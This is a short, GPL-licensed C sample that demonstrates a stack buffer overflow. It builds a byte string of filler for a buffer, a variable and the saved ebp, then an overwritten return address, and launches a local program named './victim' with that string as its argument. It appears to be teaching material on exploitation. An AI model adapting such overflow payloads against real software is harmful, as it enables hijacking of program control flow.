/*
 * MOnkey-coder: Shawn the R0ck@Copyleft
 * This sample code is GPL'ed!
 */

#include <stdio.h>

char code[] = "\x41\x41\x41\x41\x41" /*buf, fill with 'A' */
"\x41\x41\x41\x41\x41"
"\x42\x42\x42\x42" /* variable "x", fill with 'B' */
"\x43\x43\x43\x43" /* ebp, fill with 'C' */
"\x82\x84\x04\x08" /* eip, change the correct address for your machine */
"\x00"; /*end */

int main(void)
{
  char *arg[3];
  arg[0] = "./victim";
  arg[1] = code;
  arg[2] = NULL;
  execve(arg[0], arg, NULL);
  return 0;
}
